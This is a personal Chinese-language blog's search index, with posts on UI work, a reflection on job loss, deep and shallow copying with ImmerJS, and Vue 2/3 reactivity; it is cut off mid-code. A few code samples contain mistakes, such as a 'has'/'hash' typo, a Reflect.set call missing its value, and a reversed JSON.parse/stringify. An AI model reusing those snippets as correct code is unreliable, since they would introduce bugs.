<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>设计过的一些UI</title>
      <link href="/2025/03/11/UI/"/>
      <url>/2025/03/11/UI/</url>
      <content type="html"><![CDATA[<h3 id="1-logo"><a href="#1-logo" class="headerlink" title="1. logo"></a>1. logo</h3><p>2016年给第一家公司一个产品设计的logo，灵感来源于百事可乐和理发店😄<br><img src="/2025/03/11/UI/2.png" style="width: 200px"></p><p><br></p><h3 id="2-小黑板儿"><a href="#2-小黑板儿" class="headerlink" title="2. 小黑板儿"></a>2. 小黑板儿</h3><p>2017年做的一个小程序，起因是老板觉得幼儿园群聊接龙消息太多太烦。<br>于是有了这个小程序，今天拿出来看，依然画风呆萌</p><h4 id="2-1-欢迎页"><a href="#2-1-欢迎页" class="headerlink" title="2.1 欢迎页"></a>2.1 欢迎页</h4><p><img src="/2025/03/11/UI/3.png" style="width: 33%; display: inline-block"><img src="/2025/03/11/UI/4.png" style="width: 33%; display: inline-block"><img src="/2025/03/11/UI/5.png" style="width: 33%; display: inline-block"></p><h4 id="2-2-页面"><a href="#2-2-页面" class="headerlink" title="2.2 页面"></a>2.2 页面</h4><p><img src="/2025/03/11/UI/6.png"></p><p><br></p><h3 id="3-chat应用"><a href="#3-chat应用" class="headerlink" title="3. chat应用"></a>3. chat应用</h3><p>2025年给面试公司画的试稿（越看越喜欢）<br><img src="/2025/03/11/UI/1.png"></p>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>行至水穷处，坐看云起时</title>
      <link href="/2025/03/02/32%E5%B2%81/"/>
      <url>/2025/03/02/32%E5%B2%81/</url>
      <content type="html"><![CDATA[<p>哇，好久没写文章了，离上次写有10年了。为什么今天要写？因为我想把我此时的心境分享于你。</p><p>此时的我，大龄32岁、单身、无业、女，被公司辞退，在出租屋里躺了半年。</p><p>半年里先是玩了一个月游戏，去了本溪、丹东、大连，一个美丽的海滨城市，接下来就是无尽的茫然。<br><img src="/2025/03/02/32岁/1.jpeg" style="display: inline-block; width: 55%; margin: 10px 0"></p><p><br></p><p>经济下行，市场上的需求也被搞得七七八八了。经济越是低迷，人就越容易打游戏，不如去搞游戏？于是断断续续的学了threejs, cocos, unity，不同于最开始学前端的时候，这次没有提起多大的劲。</p><p>接着就是过年，大概是实在呆不住了，决定年后复习前端，找工作。</p><p>我开始翻看大佬的博客、演讲，把他们讲的东西一点点整理成笔记。</p><p><img src="/2025/03/02/32岁/3.jpeg" style="display: inline-block; width: 55%; margin: 10px 0"></p><p><br></p><p>真的好久没学习了。</p><p>从业务代码中抽身，捡起书包。哦？原来 React，Vue已经诞生10年有余。还记得第一次用<em><code>React</code></em>，感叹于它<em><code>Class Component</code></em>的精妙设计，代码组织起来既优雅又贴合JS。如果说<em><code>React</code></em>是个天才少年，它总是会提出一些奇思妙想，让你连连称赞。那<em><code>Vue</code></em>就是一个诚意满满、交出满分答卷的温柔学霸。它的各种API、指令，总能轻松的满足需求，简单、好用。</p><p><em><code>React, Vue</code></em>的出世，搭配<em><code>Ant Design、Element UI</code></em>组件库，前端生产力得到巨大的解放。彼时大量传统企业接入互联网，年轻人纷纷涌入，我们像一辆不知疲惫的马车，滚入高速运转的业务中。</p><!-- <img src="6.jpeg" style="display: inline-block; width: 16%; margin: 10px 0" /> --><p><br></p><p>十年后的今天？<br>高速发展了十年后，AI盛行，互联网需求萎缩，而涌入这个行业的新人却没有停止。<br>发展，稳定，衰落是亘古不变的事物发展规律。<br>我能做什么？<br>32岁大龄、被辞退女前端，没有大厂光环加持，勤勤恳恳的干的全是业务需求。你说这简历是不是要被扔进垃圾桶…<br>🤔真的，boss直聘上一个面试机会都木有</p><p><img src="/2025/03/02/32岁/4.jpeg" style="display: inline-block; width: 45%; margin: 10px 0 0"><br>（此图是我可爱的小侄子，他一脸茫然的表情，跟我现在好像hhh）</p><p><br></p><p>一时间不知道该做些什么。对业务需求有所疲惫，不过疲惫又算得了什么呢。更大的问题是，不知道还能精进什么，工作不好找。<br>学AI？AI距离我太遥远了。做全栈？单做前端已经很牛马了呀。<br>各种思绪飞来，万事却停滞不前，我躺在出租屋的床上，一边看着学习视频，一边玩着消消乐缓解焦虑。</p><p><br><br>很神奇，人的处境不一样，心境也会不一样。<br>以前看过的文章，重新翻开看，有了不一样的领悟。<br><em><code>Having fun, not just code for living.</code></em><br>此处很难描述总结，所以先省略，大概就是放掉对业务需求的关注，我们要从一个技术的使用者，变成一个技术的开发者！！！</p><p><br><br>大概是脑袋冒烟，突然冒出一句诗。<br><em>行至水穷处，坐看云起时。</em><br>这就是我开头说的想分享给你的、一个神奇的心境~<br>解释一下就是，<br>当你不知道要做什么，不妨先“行至”水穷处。<br>当你到了“水穷处”，看到前面没有路了，不妨坐下来，或许下一刻，就能看到水蒸发变成云，那是一道全新的路。（还有得干）<br><img src="/2025/03/02/32岁/5.jpeg" style="display: inline-block; width: 55%; margin: 10px 0"><br><br></p><p>这两天方大同去世的消息传来。周末在宿舍一遍遍重听这个可爱soul boy的歌，他的歌词怎么全是爱爱爱啊hhh。<br>最后用大同的话共勉，愿你我都能在未来的日子里持续努力，发挥潜能~</p><blockquote><p>时间不等人，随着年龄的增长，更能深入理解时间的现实与虚幻。生活给我们带来了各种各样的转折和挑战，但我认为我们的目标之一应该是以雅致得体的态度去走完生命之路。<br>在我人生中的这个特别时刻，万事停滞不前,给予了我充分的时间去反思过去、认真思考眼前的一切，并幻想未来。《梦想家》(The Dreamer)这个名字象征着，即使面对疾病和人生的种种挑战，我依然在这里，充满了创造的意境和满怀的梦想。<br>祝你在未来的日子里，继续怀抱梦想，持续努力，成长进化，在人生的每个阶段充分发挥自己的潜能。<br> —— 大同</p></blockquote><p>（保佑我顺利找到工作，希望2025年会是忙碌又充实的、新的一年。）</p><p><br><br>—— 写于2025.3.3 嘉琪<br>(我宣布，写文章要比写代码难100倍)</p>]]></content>
      
      <categories>
          
          <category> Work </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>从 ImmerJS 再看浅拷贝，深拷贝</title>
      <link href="/2025/02/24/immerjs/"/>
      <url>/2025/02/24/immerjs/</url>
      <content type="html"><![CDATA[<h3 id="1-浅拷贝"><a href="#1-浅拷贝" class="headerlink" title="1. 浅拷贝"></a>1. 浅拷贝</h3><p>仅复制对象的最外层，子对象仍为引用。实现浅拷贝的方式有：</p><ul><li><em>…拓展运算符</em></li><li><em><code>Object.assign</code></em></li><li><em><code>Array.prototype.slice()</code></em>, <em><code>Array.prototype.concat()</code></em></li><li>手写<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shallowClone</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> newObj = &#123;&#125;;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span>(obj.hasOwnProperty(prop))&#123;</span><br><span class="line">      newObj[prop] = obj[prop];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newObj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-深拷贝"><a href="#2-深拷贝" class="headerlink" title="2. 深拷贝"></a>2. 深拷贝</h3><p>深拷贝不是那么好实现的。(完全独立于副本)</p><p>首先需要精确的定义语义，哪些对象可以clone？哪些对象是不可以clone？任意对象的深度克隆，edge case 非常多，比如原生 DOM/BOM 对象怎么处理，RegExp 怎么处理，函数怎么处理，原型链怎么处理… 并不是一个简单的问题。复杂对象本身可能有很多约束，这不是一个通用的clone可以搞定的。比如dom元素的复制必须使用cloneNode方法，且它也只处理dom自己的东西。</p><p>所以我们讨论的深拷贝，是对于普通对象，或者划定好范围的深拷贝，方式有：</p><ul><li><code>lodash.cloneDeep()</code></li><li><code>jQuery.extend()</code></li><li><code>JSON.stringify(JSON.parse(obj))</code>这种方式要求必须是JSON对象，会忽略不是JSON的一些值<code>undefined</code>, <code>symbol</code>、函数</li><li>手写递归实现<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepClone</span> (<span class="params">obj, hash = new WeakMap(</span>)) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (obj === <span class="literal">null</span>) <span class="keyword">return</span> obj</span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="built_in">Date</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>(obj)</span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="built_in">RegExp</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">RegExp</span>(obj)</span><br><span class="line">  <span class="comment">// 基本类型：直接返回值</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> obj !== <span class="string">'object'</span>) <span class="keyword">return</span> obj</span><br><span class="line">  <span class="comment">// 引用类型：进行深拷贝</span></span><br><span class="line">  <span class="keyword">if</span> (has.get(obj)) <span class="keyword">return</span> hash.get(obj)</span><br><span class="line">  <span class="keyword">let</span> cloneObj = <span class="keyword">new</span> obj.constructor()</span><br><span class="line">  hash.set(obj, cloneObj)</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj.hasOwnProperty(key)) &#123;</span><br><span class="line">      cloneObj[key] = deepClone(obj[key], hash)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> cloneObj</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-ImmerJS"><a href="#3-ImmerJS" class="headerlink" title="3. ImmerJS"></a>3. ImmerJS</h3><p>实际上，clone的主要目的是数据对象的传递。</p><p><br></p><h4 id="3-1-不可变数据"><a href="#3-1-不可变数据" class="headerlink" title="3.1 不可变数据"></a>3.1 不可变数据</h4><p>我们直接复制对象<code>const obj2 = obj1</code>, 当我们修改obj2时<code>obj2.name = &#39;金毛2&#39;</code>，却不小心把obj1也修改了。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj1 = &#123;</span><br><span class="line">  name: <span class="string">'金毛1'</span>,</span><br><span class="line">  city: <span class="string">'上海'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> obj2 = obj1;</span><br><span class="line">obj2.name = <span class="string">'金毛2'</span>;</span><br><span class="line"><span class="built_in">console</span>.log(obj1) <span class="comment">// &#123;name:'金毛2', city:'上海'&#125;</span></span><br></pre></td></tr></table></figure></p><p>如果不想在修改obj2时，对obj1也产生影响。那我们需要深拷贝一个obj1出来, 然后随便玩耍。</p><p>实际的项目中要操作的例子远比这个复杂。如果是一个庞大的对象, 用<code>JSON.parse(JSON.stringify(obj1))</code>实现深拷贝会浪费大量性能在拷贝属性上, 但我们可能只是想要一个name值不同的对象而已。</p><p>这个时候，我们会想到拓展运算法<code>...</code>的写法。只修改修改的值，其他值保持原来的引用。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj2 = &#123; ...obj1, <span class="attr">name</span>: <span class="string">'金毛2'</span> &#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="3-2-基本用法"><a href="#3-2-基本用法" class="headerlink" title="3.2 基本用法"></a>3.2 基本用法</h4><p>当obj1是一个复杂的、多层嵌套的对象，我们需要一个包来帮忙处理层层嵌套的逻辑。这时就需要用到ImmerJS。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> obj2 = immer.produce(obj1, (draft) =&gt; &#123;</span><br><span class="line">  draft.name.basename[<span class="string">'2022'</span>] = <span class="string">'修改name'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-3-核心原理"><a href="#3-3-核心原理" class="headerlink" title="3.3 核心原理"></a>3.3 核心原理</h4><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://github.com/febobo/web-interview/issues/56" target="_blank" rel="noopener">深拷贝浅拷贝的区别？如何实现一个深拷贝？</a></li><li><a href="https://juejin.cn/post/7200669128289501239" target="_blank" rel="noopener">每天都在用，也没整明白的 React Hook</a></li><li><a href="https://www.zhihu.com/question/47746441/answer/107513878" target="_blank" rel="noopener">JavaScript 如何完整实现深度Clone对象？</a></li><li><a href="https://segmentfault.com/a/1190000042282263" target="_blank" rel="noopener">详聊immer.js高效复制与冻结”对象”的原理于局限性</a></li></ul>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title></title>
      <link href="/2025/02/21/%E9%9D%A2%E8%AF%95/"/>
      <url>/2025/02/21/%E9%9D%A2%E8%AF%95/</url>
      <content type="html"><![CDATA[<h1 id="HR面"><a href="#HR面" class="headerlink" title="HR面"></a>HR面</h1><h3 id="面试时，如何向公司提问？"><a href="#面试时，如何向公司提问？" class="headerlink" title="面试时，如何向公司提问？"></a>面试时，如何向公司提问？</h3><ul><li>你们为什么要招聘这个职位？</li></ul><h3 id="性格怎样"><a href="#性格怎样" class="headerlink" title="性格怎样"></a>性格怎样</h3><p>INTJ（内向、直觉、思考、喜欢做计划）<br>I：从独处和思考中获得能量，对社交活动感到消耗。而不是不能社交<br>N：直觉，喜欢抽象概念、事件间的联系</p>]]></content>
      
      
    </entry>
    
    <entry>
      <title>Vue响应式问题是真的多 -_-||</title>
      <link href="/2025/02/17/Vue-%E5%93%8D%E5%BA%94%E5%BC%8F/"/>
      <url>/2025/02/17/Vue-%E5%93%8D%E5%BA%94%E5%BC%8F/</url>
      <content type="html"><![CDATA[<blockquote><p>一个Vue的复杂响应式对象都劫持了哪些key？哪些属性是响应式的？如果把这个key抽离出来，还有响应式吗？什么情况下会出现响应式丢失？为什么 Vue2 里会有<code>$set</code> 方法？为什么 Vue3 里会有 <code>toRef</code>, <code>.value</code>？<code>Ref</code>, <code>Reactive</code>, <code>shallowRef</code>的区别是什么？<br>（刚被面试官问得我一愣一愣的，Vue的响应式怎么这么多问题 -_-||）</p></blockquote><p><br></p><h3 id="1-Object-defineProperty"><a href="#1-Object-defineProperty" class="headerlink" title="1. Object.defineProperty"></a>1. Object.defineProperty</h3><h4 id="1-1-实现响应式"><a href="#1-1-实现响应式" class="headerlink" title="1.1 实现响应式"></a>1.1 实现响应式</h4><p>Vue2使用<code>Object.defineProperty(obj, key, handlers)</code>实现响应式。这个方法必须指定<code>key</code>键，在组件初始化时，vue2 会深度遍历data的每个key进行劫持。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reactive</span>(<span class="params">raw</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">Object</span>.keys(raw).forEach(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> dep = <span class="keyword">new</span> Dep()</span><br><span class="line">    <span class="keyword">let</span> value = raw[key]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(raw, key, &#123;</span><br><span class="line">      get() &#123;</span><br><span class="line">        dep.depend()</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">      &#125;,</span><br><span class="line">      set(newValue) &#123;</span><br><span class="line">        value = newValue</span><br><span class="line">        dep.notify()</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">return</span> raw</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-2-Vue2都劫持了哪些key"><a href="#1-2-Vue2都劫持了哪些key" class="headerlink" title="1.2 Vue2都劫持了哪些key?"></a>1.2 Vue2都劫持了哪些key?</h4><p>data的第一层key都被劫持到，如果某一个key的value是对象和数组。我们操作<code>this.$data.a.b = 1</code>会有响应式效果吗？</p><p><em>对象</em><br>对对象的子属性进行深度遍历监听</p><p><em>数组</em><br>Vue 没有对每个数组项设置监听，但是如果数组项是对象，Vue还是给这个对象所有key监听了。</p><p><em>总结</em><br>所以你可以理解，面对复杂对象、数组，Vue没有对数组索引下标（这个key）添加监听，其他都监听了。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      list: [</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        &#123; <span class="attr">name</span>: <span class="number">1</span> &#125;,</span><br><span class="line">        [</span><br><span class="line">          &#123; <span class="attr">name</span>: <span class="number">1</span> &#125;</span><br><span class="line">        ]</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    changeList () &#123;</span><br><span class="line">      <span class="keyword">this</span>.list[<span class="number">0</span>] = <span class="number">2</span>          <span class="comment">// 不会触发渲染</span></span><br><span class="line">      <span class="keyword">this</span>.list[<span class="number">1</span>] = <span class="number">1</span>          <span class="comment">// 不会触发渲染</span></span><br><span class="line">      <span class="keyword">this</span>.list[<span class="number">1</span>].name = <span class="number">2</span>     <span class="comment">// 会触发渲染</span></span><br><span class="line">      <span class="keyword">this</span>.list[<span class="number">2</span>][<span class="number">0</span>] = <span class="number">3</span>       <span class="comment">// 不会触发渲染</span></span><br><span class="line">      <span class="keyword">this</span>.list[<span class="number">2</span>][<span class="number">0</span>].name = <span class="number">3</span>  <span class="comment">// 会触发渲染</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-3-源码解析"><a href="#1-3-源码解析" class="headerlink" title="1.3 源码解析"></a>1.3 源码解析</h4><p>除了实现上面的效果。如果newVal是一个全新的值，索引地址变了，会重新触发Object.defineProperty<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 源码地址：src/core/observer/index.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">observe</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> Observer(value)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Observer</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (value) &#123;    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(value)) &#123;</span><br><span class="line">      <span class="comment">// 变量是数组，遍历数组，如果数组里的元素是对象，就为对象里的key调用Object.defineProperty</span></span><br><span class="line">      <span class="keyword">this</span>.observeArray(value)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="comment">// 变量是对象，遍历所有key值，为每个key调用Object.defineProperty</span></span><br><span class="line">      <span class="keyword">this</span>.walk(value)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  walk (obj: <span class="built_in">Object</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> keys = <span class="built_in">Object</span>.keys(obj)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.length; i++) &#123;</span><br><span class="line">      defineReactive(obj, keys[i])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  observeArray (items: <span class="built_in">Array</span>&lt;any&gt;) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, l = items.length; i &lt; l; i++) &#123;</span><br><span class="line">      observe(items[i])</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Define a reactive property on an Object.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">defineReactive</span> (<span class="params">obj, key, val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> childOb = !shallow &amp;&amp; observe(val)</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(obj, key, &#123;</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span> <span class="title">reactiveGetter</span> (<span class="params"></span>) </span>&#123;&#125;,</span><br><span class="line">    set: <span class="function"><span class="keyword">function</span> <span class="title">reactiveSetter</span> (<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">      <span class="comment">// 如果newVal是一个全新的值，索引地址变了，会重新触发ObjectProperty</span></span><br><span class="line">      childOb = !shallow &amp;&amp; observe(newVal)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-4-哪些变动不会有响应式？-set-Array-property"><a href="#1-4-哪些变动不会有响应式？-set-Array-property" class="headerlink" title="1.4 哪些变动不会有响应式？($set, Array.property)"></a>1.4 哪些变动不会有响应式？($set, Array.property)</h4><p>从上面得知，<code>Object.defineProperty</code>的性质使得，Vue不能监听这些变动：</p><ul><li>添加根级别对象<code>key</code></li><li>对已有对象添加删除<code>key</code></li></ul><p>为每个数组项进行监听开销太大，使得Vue不能监听这些变动：</p><ul><li>利用索引设置一个数组项<code>vm.items[index] = newValue</code></li><li>修改数组长度<code>vm.items.length = newLength</code></li></ul><p><br></p><p>但我们可以通过这些手段，处理这个问题</p><ol><li><p>修改内存地址，赋一个全新的值，触发一次新的监听绑定</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 新增修改对象property</span></span><br><span class="line"><span class="keyword">this</span>.someObject = <span class="built_in">Object</span>.assign(&#123;&#125;, <span class="keyword">this</span>.someObject, &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 总是返回一个新数组</span></span><br><span class="line">filter(), concat(), slice()</span><br></pre></td></tr></table></figure></li><li><p>调用<code>vm.$set</code>方法<br>vm.$set做了什么？<br><code>target</code>是数组时，执行<code>target.splice(key, 1, val)</code><br><code>target</code>是对象时，如果<code>key</code>已经存在，直接赋值；如果<code>key</code>不存在，<code>defineReactive(ob.value, key, val)</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$set(<span class="keyword">this</span>.someObject,<span class="string">'b'</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">this</span>.$set(vm.items, indexOfItem, newValue)</span><br></pre></td></tr></table></figure></li><li><p>调用数组方法<br>Vue hack了 push, pop 等数组的原型方法<code>Array.prototype</code>，使得调用这些方法也会产生响应式效果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.items.splice(newLength)</span><br><span class="line">push(), pop(), shift(), unshift(), splice(), sort(), reverse()</span><br></pre></td></tr></table></figure></li></ol><p><br></p><h4 id="1-5-watch-deep"><a href="#1-5-watch-deep" class="headerlink" title="1.5 watch deep"></a>1.5 watch deep</h4><p>深度遍历所有子属性，触发所有子属性的getter函数执行，收集依赖-watch后需要执行的事件<br><br></p><p><br></p><h3 id="2-Proxy"><a href="#2-Proxy" class="headerlink" title="2. Proxy"></a>2. Proxy</h3><h4 id="2-1-实现响应式"><a href="#2-1-实现响应式" class="headerlink" title="2.1 实现响应式"></a>2.1 实现响应式</h4><p>通过 Proxy 劫持整个对象，包括所有数组和动态添加的属性，支持深度响应式。<br>在Vue3，如果reactive的变量是个数组，当你设置<code>arr[index] = 1</code>，会触发set，而访问会触发get，依赖会被自动添加。对于数组变化，就不用做额外的处理。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> reactiveHandlers = &#123;</span><br><span class="line">  get (target, key, receiver) &#123;</span><br><span class="line">    <span class="keyword">const</span> dep = getDep(target, key)</span><br><span class="line">    dep.depend()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.get(target, key, receiver) <span class="comment">// 反射，做该对象本该做的事</span></span><br><span class="line">  &#125;,</span><br><span class="line">  set (target, key, value, receiver) &#123;</span><br><span class="line">    <span class="keyword">const</span> dep = getDep(target, key)</span><br><span class="line">    dep.notify()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Reflect</span>.set(target, key, receiver)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reactive</span>(<span class="params">raw</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Proxy</span>(raw, reactiveHandlers)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>Proxy的响应式是绑定在哪一级？如果我们把object中的某个key抽离出来，还有响应式吗？</p><p><br></p><h4 id="2-2-Ref-Reactive-shallowRef的区别"><a href="#2-2-Ref-Reactive-shallowRef的区别" class="headerlink" title="2.2 Ref, Reactive, shallowRef的区别"></a>2.2 Ref, Reactive, shallowRef的区别</h4><ul><li><code>Ref</code><br>Ref用来包装基本类型或对象，通过.value访问，响应式的是整个值的变化。<ul><li>数字、字符串等基本类型必须用 ref。</li><li>需要明确替换整个对象时也可用 ref。</li></ul></li></ul><ul><li><p><code>Reactive</code><br>Reactive使用Proxy代理对象，深度响应式。</p><ul><li>处理对象/数组时优先使用，语法更简洁。</li><li>避免解构响应式对象（用 toRefs 解决解构问题）。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> state = reactive(&#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span> &#125;);</span><br><span class="line"><span class="keyword">const</span> &#123; a, b &#125; = toRefs(state); <span class="comment">// 保持响应式</span></span><br><span class="line">a.value++; <span 